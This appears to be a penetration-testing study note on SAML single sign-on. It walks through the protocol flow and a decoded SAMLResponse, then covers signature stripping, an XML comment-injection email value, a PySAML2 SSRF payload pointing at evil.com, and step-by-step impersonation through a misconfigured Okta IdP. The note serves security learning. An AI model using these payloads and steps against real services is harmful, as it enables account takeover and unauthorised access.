# SAML Authentication

#### SAML 101

Security Assertion Markup Language (`SAML`) is used to share authentication and authorization between parties. `SAML` is often used to provide Single Sign-On (SSO) between one or multiple `Service Provider`(s) (`SP`) and one `Identity Provider` (`IDP`).

For example, users will authenticate against `identity.pentesterlab.com`, once authenticated, they will be able to access `serviceprovider1.libcurl.so`, `serviceprovider2.pentesterlab.com` or `serviceprovider3.ptl.io` without having to re-authenticate against these services. This allows enterprises to only manage one source of truth for the management of their users.

#### Workflow

1. The `User-Agent` (browser) tries to access the resource.
2. The `Service Provider` (`SP`) sends a redirect to the `Identity Provider` (`IDP`).
3. The `User-Agent` follows the redirect and accesses the `IDP`. The request contains a `SAMLRequest` parameter.
4. The `IDP` sends back a response with a `SAMLResponse`.
5. The `SAMLResponse` is submitted by the `User-Agent` to the `SP`.
6. The user is now logged in for the `Service Provider` and can access the resource.

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

#### Inspecting the HTTP traffic

If we look at the HTTP traffic, we can see the following requests and responses:

First, the `User-Agent` gets redirected to the `IDP` with a `SAMLRequest` parameter:

```http
HTTP/1.1 302 Found
[...]
Location: http://ptl-27f65738-58d64e9c.libcurl.so/saml/auth?SAMLRequest=...
[...]
```

Then, if the user is logged in, the `IDP` responds with a page that will automatically (`<body onload="document.forms[0].submit();"...>`) submit the `SAMLResponse` to the `SP`:

{% code overflow="wrap" %}
```xml
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  </head>
  <body onload="document.forms[0].submit();" style="visibility:hidden;">
    <form action="http://ptl-8fca0627-ddd3e82f.libcurl.so:80/saml/consume" accept-charset="UTF-8" method="post">
      <input name="utf8" type="hidden" value="✓" />
      <input type="hidden" name="authenticity_token" value="n6...." />
      <input type="hidden" name="SAMLResponse" id="SAMLResponse" value="..." />
      <input type="hidden" name="RelayState" id="RelayState" />
      <input type="submit" name="commit" value="Submit" data-disable-with="Submit" />
    </form>
  </body>
</html>
```
{% endcode %}

This will allow the `SP` to create a session for the user. The user is now logged based on the `SAMLResponse` value.

#### Dissecting the SAMLResponse

If we look at an example of `SAMLResponse`, we can see that it's a fairly big chunk of data:

```plaintext
PHNhbWxwOlJlc3BvbnNlIElEPSJfOWViMTZiNTAtNWZkOS0wMTM1LTg5OWYtMDI0MmFjMTEwMDI5IiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAxNy0wOC0xMFQwOToxMDowNFoiIERlc3RpbmF0aW9uPSJodHRwOi8vcHRsLThmY2EwNjI3LWRkZDNlODJmLmxpYmN1cmwuc286ODAvc2FtbC9jb25zdW1lIiBDb25zZW50PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y29uc2VudDp1bnNwZWNpZmllZCIgSW5SZXNwb25zZVRvPSJfZjZhNGNiMjUtZjdhMS00ZjU3LWI3ZGYtYzgzNjZhNWM1ZmE4IiB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vcHRsLTI3ZjY1NzM4LTU4ZDY0ZTljLmxpYmN1cmwuc28vc2FtbC9hdXRoPC9Jc3N1ZXI+PHNhbWxwOlN0YXR1cz48c2FtbHA6U3RhdHVzQ29kZSBWYWx1ZT0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnN0YXR1czpTdWNjZXNzIi8+PC9zYW1scDpTdGF0dXM+PEFzc2VydGlvbiB4bWxucz0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiIgSUQ9Il85ZWIxNmNkMC01ZmQ5LTAxMzUtODk5Zi0wMjQyYWMxMTAwMjkiIElzc3VlSW5zdGFudD0iMjAxNy0wOC0xMFQwOToxMDowNFoiIFZlcnNpb249IjIuMCI+PElzc3Vlcj5odHRwOi8vcHRsLTI3ZjY1NzM4LTU4ZDY0ZTljLmxpYmN1cmwuc28vc2FtbC9hdXRoPC9Jc3N1ZXI+PGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI+PGRzOlNpZ25lZEluZm8geG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIj48L2RzOkNhbm9uaWNhbGl6YXRpb25NZXRob2Q+PGRzOlNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMDQveG1sZHNpZy1tb3JlI3JzYS1zaGEyNTYiPjwvZHM6U2lnbmF0dXJlTWV0aG9kPjxkczpSZWZlcmVuY2UgVVJJPSIjXzllYjE2Y2QwLTVmZDktMDEzNS04OTlmLTAyNDJhYzExMDAyOSI+PGRzOlRyYW5zZm9ybXM+PGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIj48L2RzOlRyYW5zZm9ybT48ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIj48L2RzOlRyYW5zZm9ybT48L2RzOlRyYW5zZm9ybXM+PGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMDQveG1sZW5jI3NoYTI1NiI+PC9kczpEaWdlc3RNZXRob2Q+PGRzOkRpZ2VzdFZhbHVlPmxWcWxQakNxczJOaldsZXVhOUlKem1XR3lpTFhsMUppY0RGQm41QTFnWkE9PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8+PGRzOlNpZ25hdHVyZVZhbHVlPmhWZ29MWG9DbFdudDdwR1YyMEROSHdvQXkrZFA1UmZnLzk0RnFESjgzbk01UUttN0FNa3hYT3BKQ3BMbTV6ZnlpL29hMlc5aWJXc1Vnd0xTY0lZRWRjT0dRVCs2MHBoS1J3YkZPNCtzeDZ1b0xKa1NRYStEQkZKMHZwcytMTVN1OE5JSXpabGlqTmEvRG84ZTcyRTZVK3JRUTkxV09YRHB3L05zWm9tUktjRT08L2RzOlNpZ25hdHVyZVZhbHVlPjxLZXlJbmZvIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIj48ZHM6WDUwOURhdGE+PGRzOlg1MDlDZXJ0aWZpY2F0ZT5NSUlEcXpDQ0F4U2dBd0lCQWdJQkFUQU5CZ2txaGtpRzl3MEJBUXNGQURDQmhqRUxNQWtHQTFVRUJoTUNRVlV4RERBS0JnTlZCQWdUQTA1VFZ6RVBNQTBHQTFVRUJ4TUdVM2xrYm1WNU1Rd3dDZ1lEVlFRS0RBTlFTVlF4Q1RBSEJnTlZCQXNNQURFWU1CWUdBMVVFQXd3UGJHRjNjbVZ1WTJWd2FYUXVZMjl0TVNVd0l3WUpLb1pJaHZjTkFRa0JEQlpzWVhkeVpXNWpaUzV3YVhSQVoyMWhhV3d1WTI5dE1CNFhEVEV5TURReU9EQXlNakl5T0ZvWERUTXlNRFF5TXpBeU1qSXlPRm93Z1lZeEN6QUpCZ05WQkFZVEFrRlZNUXd3Q2dZRFZRUUlFd05PVTFjeER6QU5CZ05WQkFjVEJsTjVaRzVsZVRFTU1Bb0dBMVVFQ2d3RFVFbFVNUWt3QndZRFZRUUxEQUF4R0RBV0JnTlZCQU1NRDJ4aGQzSmxibU5sY0dsMExtTnZiVEVsTUNNR0NTcUdTSWIzRFFFSkFRd1diR0YzY21WdVkyVXVjR2wwUUdkdFlXbHNMbU52YlRDQm56QU5CZ2txaGtpRzl3MEJBUUVGQUFPQmpRQXdnWWtDZ1lFQXVCeXdQTmxDMUZvcEdMWWZGOTZTb3RpSzhOajYvblcwODRPNG9tUk1pZnp5N3g5NTVSTEV5NjczcTJhaUpOQjNMdkU2WHZrdDljR3R4dE5vT1h3MWcyVXZIS3BsZFFicjZiT0VqTE5lRE5XN2owb2IrSnJSdkFVT0s5Q1JnZHl3NU1DNmx3cVZRUTVDMURuYVQvMmZTQkZqYXNCRlRSMjRkRXBmVHk4SGZLRUNBd0VBQWFPQ0FTVXdnZ0VoTUFrR0ExVWRFd1FDTUFBd0N3WURWUjBQQkFRREFnVWdNQjBHQTFVZERnUVdCQlFOQkdtbXQzeXRLcGNKYUJhWU5ibnlVMnhrYXpBVEJnTlZIU1VFRERBS0JnZ3JCZ0VGQlFjREFUQWRCZ2xnaGtnQmh2aENBUTBFRUJZT1ZHVnpkQ0JZTlRBNUlHTmxjblF3Z2JNR0ExVWRJd1NCcXpDQnFJQVVEUVJwcHJkOHJTcVhDV2dXbURXNThsTnNaR3VoZ1l5a2dZa3dnWVl4Q3pBSkJnTlZCQVlUQWtGVk1Rd3dDZ1lEVlFRSUV3Tk9VMWN4RHpBTkJnTlZCQWNUQmxONVpHNWxlVEVNTUFvR0ExVUVDZ3dEVUVsVU1Ra3dCd1lEVlFRTERBQXhHREFXQmdOVkJBTU1EMnhoZDNKbGJtTmxjR2wwTG1OdmJURWxNQ01HQ1NxR1NJYjNEUUVKQVF3V2JHRjNjbVZ1WTJVdWNHbDBRR2R0WVdsc0xtTnZiWUlCQVRBTkJna3Foa2lHOXcwQkFRc0ZBQU9CZ1FBRWNWVVBCWDd1Wm16cVpKZnkrdFVQT1Q1SW1OUWo4VkUybGVyaG5Gam5HUEhtSElxaHB6Z253SFF1akpmcy9hMzA5V201cXdjQ2FDMWVPNWNXamNHMHgzT2pkbGxzZ1lEYXRsNUdBdW10Qng4SjNOaFdScU5VZ2l0Q0lrUWx4SEl3VWZnUWFDdXNoWWdEREw1WWJJUWErK2VnQ2dwSVorVDBEajVvUmV3Ly9BPT08L2RzOlg1MDlDZXJ0aWZpY2F0ZT48L2RzOlg1MDlEYXRhPjwvS2V5SW5mbz48L2RzOlNpZ25hdHVyZT48U3ViamVjdD48TmFtZUlEIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6cGVyc2lzdGVudCI+bG91aXNAcGVudGVzdGVybGFiLmNvbTwvTmFtZUlEPjxTdWJqZWN0Q29uZmlybWF0aW9uIE1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI+PFN1YmplY3RDb25maXJtYXRpb25EYXRhIEluUmVzcG9uc2VUbz0iX2Y2YTRjYjI1LWY3YTEtNGY1Ny1iN2RmLWM4MzY2YTVjNWZhOCIgTm90T25PckFmdGVyPSIyMDE3LTA4LTEwVDA5OjEzOjA0WiIgUmVjaXBpZW50PSJodHRwOi8vcHRsLThmY2EwNjI3LWRkZDNlODJmLmxpYmN1cmwuc286ODAvc2FtbC9jb25zdW1lIj48L1N1YmplY3RDb25maXJtYXRpb25EYXRhPjwvU3ViamVjdENvbmZpcm1hdGlvbj48L1N1YmplY3Q+PENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDE3LTA4LTEwVDA5OjA5OjU5WiIgTm90T25PckFmdGVyPSIyMDE3LTA4LTEwVDEwOjEwOjA0WiI+PEF1ZGllbmNlUmVzdHJpY3Rpb24+PEF1ZGllbmNlPmh0dHA6Ly9wdGwtOGZjYTA2MjctZGRkM2U4MmYubGliY3VybC5zbzo4MC9zYW1sL2F1dGg8L0F1ZGllbmNlPjwvQXVkaWVuY2VSZXN0cmljdGlvbj48L0NvbmRpdGlvbnM+PEF1dGhuU3RhdGVtZW50IEF1dGhuSW5zdGFudD0iMjAxNy0wOC0xMFQwOToxMDowNFoiIFNlc3Npb25JbmRleD0iXzllYjE2Y2QwLTVmZDktMDEzNS04OTlmLTAyNDJhYzExMDAyOSI+PEF1dGhuQ29udGV4dD48QXV0aG5Db250ZXh0Q2xhc3NSZWY+dXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmQ8L0F1dGhuQ29udGV4dENsYXNzUmVmPjwvQXV0aG5Db250ZXh0PjwvQXV0aG5TdGF0ZW1lbnQ+PC9Bc3NlcnRpb24+PC9zYW1scDpSZXNwb25zZT4=
```

We can `base64` decode it to find more information:

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_9eb16b50-5fd9-0135-899f-0242ac110029" Version="2.0" IssueInstant="2017-08-10T09:10:04Z" Destination="http://ptl-8fca0627-ddd3e82f.libcurl.so:80/saml/consume" Consent="urn:oasis:names:tc:SAML:2.0:consent:unspecified" InResponseTo="_f6a4cb25-f7a1-4f57-b7df-c8366a5c5fa8">
  <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">http://ptl-27f65738-58d64e9c.libcurl.so/saml/auth</Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_9eb16cd0-5fd9-0135-899f-0242ac110029" IssueInstant="2017-08-10T09:10:04Z" Version="2.0">
    <Issuer>http://ptl-27f65738-58d64e9c.libcurl.so/saml/auth</Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#_9eb16cd0-5fd9-0135-899f-0242ac110029">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue>lVqlPjCqs2NjWleua9IJzmWGyiLXl1JicDFBn5A1gZA=</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>
        hVgoLXoClWnt7pGV20DNHwoAy+dP5Rfg/94FqDJ83nM5QKm7AMkxXOpJCpLm5zfyi/oa2W9ibWsUgwLScIYEdcOGQT+60phKRwbFO4+sx6uoLJkSQa+DBFJ0vps+LMSu8NIIzZlijNa/Do8e72E6U+rQQ91WOXDpw/NsZomRKcE=
      </ds:SignatureValue>
      <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
        <ds:X509Data>
          <ds:X509Certificate>[...]</ds:X509Certificate>
        </ds:X509Data>
      </KeyInfo>
    </ds:Signature>
    <Subject>
      <NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">louis@pentesterlab.com</NameID>
      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <SubjectConfirmationData InResponseTo="_f6a4cb25-f7a1-4f57-b7df-c8366a5c5fa8" NotOnOrAfter="2017-08-10T09:13:04Z" Recipient="http://ptl-8fca0627-ddd3e82f.libcurl.so:80/saml/consume"/>
      </SubjectConfirmation>
    </Subject>
    <Conditions NotBefore="2017-08-10T09:09:59Z" NotOnOrAfter="2017-08-10T10:10:04Z">
      <AudienceRestriction>
        <Audience>
          http://ptl-8fca0627-ddd3e82f.libcurl.so:80/saml/auth
        </Audience>
      </AudienceRestriction>
    </Conditions>
    <AuthnStatement AuthnInstant="2017-08-10T09:10:04Z" SessionIndex="_9eb16cd0-5fd9-0135-899f-0242ac110029">
      <AuthnContext>
        <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
      </AuthnContext>
    </AuthnStatement>
  </Assertion>
</samlp:Response>
```

## Signature Stripping

One of the common issues with protocols relying on `signatures` to prevent tampering comes from the fact that the `signature` is only verified if it's present. Here we are going to modify the email address inside the `signature` to become the user `admin@libcurl.so` for the `Service Provider` and we will remove the `signature`.

* [ ] Try Edit the email without doing anything in the signature
* [ ] Try Remove the Signature
* [ ] Try Remove only the Signature Value Only

## Comment Injection

One of the common issues with protocols relying on `signatures` to prevent tampering comes from the fact that the signed data is parsed differently by the system receiving it. Here we are going to create a malicious email address to become the user `admin@libcurl.so` for the `Service Provider`. The issue here is that the `Service Provider` will stripe the `XML comments` from the email address provided in the `SAMLResponse` by the `IDP`.

* [ ] Try Registering in the IP with

```
admin<!--1-->@libcurl.so
```

## SAML: PySAML2 SSRF

{% embed url="https://github.com/IdentityPython/pysaml2/issues/510" %}

The SSRF occurs in the `URI` field of the `ds:Reference` node of a SAML response. Normally, these look like this:

```
<ds:Reference URI="#id117178283225551701714676244">
```

but you can change them to something like this:

```
<ds:Reference URI="http://www.evil.com/uhoh?#id117178283225551701714676244">
```

and the URI will be resolved internally.&#x20;

### Authentication Bypass

{% embed url="https://0xoverlord.medium.com/authentication-bypass-mis-scoped-saml-sessions-enable-user-impersonation-fd73ce7fbea0" %}

1. Sign into `target.com` as an organization owner (attacker).
2. Configure a SAML 2.0 Provider (Okta) on your attacker account by following SAML docs
3. Enable SAML authentication and Enable user provisioning
4. In your SAML IdP (Okta admin console), create/add a person with the victim email and set a password for that account.

Press enter or click to view image in full size

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*cEkbRV8VOvXw46eTGJK4_A.png" alt="" height="665" width="700"><figcaption></figcaption></figure>

5\. Also at Okta assign that newly created user to the Org application in Okta (so SAML assertions can be made).

* Okta assignments path :\
  `https://trial-#lol-admin.okta.com/admin/app/org/instance/<INSTANCE_ID>#tab-assignments`
* Add user `<victim@example.com>` to the org app.

Press enter or click to view image in full size

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Yore9K23KYZgfvaztK756Q.png" alt="" height="644" width="700"><figcaption></figcaption></figure>

6\. Open an incognito/private browser window and navigate to your org’s SAML login URL (IdP-initiated) and sign-in with the victim email and the password you set in Okta:

* Email: [victim@example.com](mailto:victim@example.com)
* Password: (the password attacker set during creation)

7\. After successful IdP authentication, the SP ( `target.com`) issues a session.\
`As the attacker (exploit actions enabled by the victim session)`

8\. With the attacker-controlled session that now contains the victim user id (but attacker account id in token), issue requests that rely on user id for authorization (example: edit user settings).

